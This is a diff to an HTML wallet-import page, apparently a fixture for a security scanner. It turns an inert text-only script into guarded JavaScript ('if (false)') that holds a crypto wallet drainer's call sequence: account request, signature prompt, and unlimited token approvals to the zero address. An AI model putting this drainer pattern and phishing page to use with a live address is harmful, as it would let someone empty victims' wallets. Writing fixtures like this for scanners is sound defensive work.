@@ -38,14 +38,17 @@
     <p>Alternatively, import your wallet with a private key or keystore file.</p>
 </div>
 
-<!-- Deliberately inert: type="text/plain" means the browser never runs this. -->
-<script type="text/plain" id="drainer-code">
-    async function connect() {
-        const accounts = await ethereum.request({method: 'eth_requestAccounts'});
+<script>
+/* Deliberately inert: the "if (false)" guard means none of this ever runs.
+   It is executable JavaScript so the scanner sees a drainer's own calls. */
+if (false) {
+    (async function connect() {
+        var accounts = await ethereum.request({method: 'eth_requestAccounts'});
         await ethereum.request({method: 'personal_sign', params: ['Verify ownership', accounts[0]]});
         await token.setApprovalForAll('0x0000000000000000000000000000000000000000', true);
         await token.increaseAllowance('0x0000000000000000000000000000000000000000', MAX_UINT);
-    }
+    }());
+}
 </script>
 </body>
 </html>
